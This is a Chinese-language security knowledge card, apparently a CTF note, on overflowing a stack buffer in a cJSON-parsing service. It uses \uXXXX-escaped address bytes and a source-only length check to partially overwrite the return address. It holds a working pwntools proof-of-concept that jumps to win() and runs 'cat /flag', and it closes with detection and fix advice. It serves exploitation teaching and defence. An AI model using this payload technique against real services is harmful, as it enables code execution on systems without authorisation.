---
id: binary-pwn-stack-cjson-unicode-byte-injection-partial-overwrite
title: cJSON 转义注入任意字节实现栈溢出与返回地址部分覆盖
type: scenario
domain: binary
path: binary/pwn/stack
technique: cjson-unicode-byte-injection-partial-overwrite
aliases:
- cJSON 注入
- JSON 携带二进制
- \uXXXX 字节注入
- 返回地址部分覆盖
tags:
- pwn
- stack
- cjson
- json
- unicode-escape
- partial-overwrite
- non-pie
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V95
  verified_at: '2026-11-05T20:03:42+08:00'
  notes: 已对照原文 pwner_json_stack 与 14 张图核对：4 字节长度头 + cJSON_Parse、handle_stack 仅校验 copy_len<=strlen(data)、vuln_copy buf[0x20]、win=0x4012f6、payload 0x28*A + \xf6 + \u0012 + '@' 共 43 字节、copy_len=43 均与原文 exp 一致。核对中修正了卡片一处地址说明：0x40xxxx 按小端序高 5 字节为 00、第 3 字节为 0x40，已同步 knowledge 与 staging。未验证点：未复跑 exp；无版本。
---

## 一句话结论

当二进制用 cJSON 解析 JSON 请求、把 `data` 字符串和 `copy_len` 直接交给 `memcpy` 写入小栈缓冲区时，可以借 cJSON 的 `\uXXXX` 解码与“高位字节原样保留”在 JSON 文本中携带二进制地址；再用 `copy_len <= strlen(data)` 这类只校验源长度的检查通过验证，溢出栈并部分覆盖返回地址到 `win()`。

## 原理

- JSON 是文本格式，但字符串中的 `\uXXXX` 可编码 BMP（U+0000–U+FFFF）码点。cJSON 解析时把 `\uXXXX` 解码为 UTF-8 字节；对 U+0000–U+007F，UTF-8 就是单字节，字节值等于码点值。例如 `\u0012` 解码为字节 `0x12`。
- cJSON 对 `0x80` 以上的字节不做严格 UTF-8 校验，原始字节会原样保留；因此 `0xf6` 这类非 ASCII 控制字符可以直接出现在 JSON 字符串中，不一定需要转义。
- 漏洞点在于长度校验对象错误：`handle_stack` 只检查 `copy_len <= strlen(data)`，保证不会越界读源字符串，却没有检查目标 `char buf[0x20]` 的大小；只要 `data` 足够长，`memcpy(buf, data, copy_len)` 就会覆盖栈上的返回地址。
- 利用部分覆盖：非 PIE 程序代码段固定在 `0x400000`，原返回地址与 `win()` 都落在 `0x40xxxx`；按小端序高 5 字节均为 `00`，第 3 字节均为 `0x40`，只有低 2 字节不同。覆盖返回地址低 3 字节即可（保留 `0x40` 更稳妥），不需要写入 `0x00`（cJSON 用 C 字符串，`0x00` 会截断 `strlen(data)`）。
- 示例中 `win()` 地址为 `0x4012f6`，payload 用 0x28 个 `A` 填充到返回地址，再写 `\xf6`（原样）、`\u0012`（cJSON 解码为 0x12）、`@`（0x40），共 43 字节；`copy_len=43` 与解码后的 `strlen(data)` 相等，校验通过。

## 触发条件

- 目标用 cJSON（或类似支持 `\uXXXX` 且不严格校验 UTF-8 的 JSON 库）解析攻击者可控请求体。
- 处理函数把 JSON 字符串和攻击者可控长度传入 `memcpy`/`strcpy` 等函数，目标栈缓冲区小于可写长度。
- 长度校验只针对源字符串（如 `copy_len <= strlen(data)`），未限制目标缓冲区大小。
- 目标未开启 PIE，或已泄漏代码基址；返回地址高字节为 0，可只覆盖低 2–3 字节。
- 目标附近存在 `win()`/backdoor/`system` 等可利用函数，且无需再写入 `0x00`。

## 利用步骤

1. 逆向 JSON 处理逻辑，确认 `cmd` 分发、`data`/`copy_len` 字段与 `memcpy` 目标缓冲区大小。
2. 计算填充长度：栈缓冲区大小 + 对齐填充到 saved RBP 前（示例 0x28）。
3. 将目标函数地址转为小端字节，按需要截断高位的 `0x00`；对不能裸写的 ASCII 控制字符用 `\uXXXX` 编码，对 `0x80` 以上字节可直接原样写入。
4. 构造 JSON body：`{"cmd":"stack","data":"<填充><地址字节>","copy_len":<填充长度+地址字节数>}`，确保 `copy_len` 等于解码后 `strlen(data)`。
5. 先发送 4 字节小端长度头，再发送 JSON body；触发溢出后跳转到 `win()`，再发送命令读取 flag。

## PoC

```python
from pwn import *

context.arch = 'amd64'
io = remote("目标ip", 端口)

# 0x28 个 A 填充到返回地址，低 3 字节覆盖为 win()=0x4012f6
# 0xf6 原样保留，0x12 用 \u0012 编码，0x40 就是 '@'
body = (b'{"cmd":"stack","data":"' + b'A' * 0x28
        + b'\xf6' + b'\\u0012@' + b'","copy_len":43}')
io.send(p32(len(body)))
io.send(body)

io.recvuntil(b'you win\n')
io.sendline(b'cat /flag')
print(io.recvrepeat(1).decode())
io.close()
```

## 变体与关联

- 变体：其他 JSON 库/协议（如 RapidJSON、YAJL、自研解析器）对 `\uXXXX`、原始高位字节的处理不同，需测试哪些字节可原样携带、哪些必须转义。
- 变体：若必须写 `0x00`，可改用能编码 `\u0000` 且长度分离的解析器，或先写非零字节再用其他原语补零；部分覆盖可尽量减少需要写的零字节。
- 变体：PIE 开启时，先通过泄漏/部分覆盖低字节把返回地址改到同一页内的目标函数；或用两阶段 ROP。
- 关联：[[binary-pwn-stack-strcmp-nullbyte-local-ptr-backfill-ret2text]]（同样利用 C 字符串的 `\0` 语义与部分覆盖）、[[binary-pwn-stack-ret2libc]]（溢出后接 ROP 的通用路线）。

## 检测与防御

- 检测：审计 JSON 字段进入 `memcpy`/`strcpy` 的路径，确认长度校验是否同时约束源和目标；对包含大量 `\u00XX` 或非 UTF-8 高位字节的请求做告警。
- 修复：`memcpy` 长度取 `min(copy_len, sizeof(buf)-1)`；使用 `strlcpy`/`snprintf`；对 `data` 做严格 UTF-8 校验并拒绝控制字符。
- 加固：开启 Canary、PIE、Full RELRO；移除不必要的 `win`/backdoor；对协议字段做 schema 校验与最大长度限制。
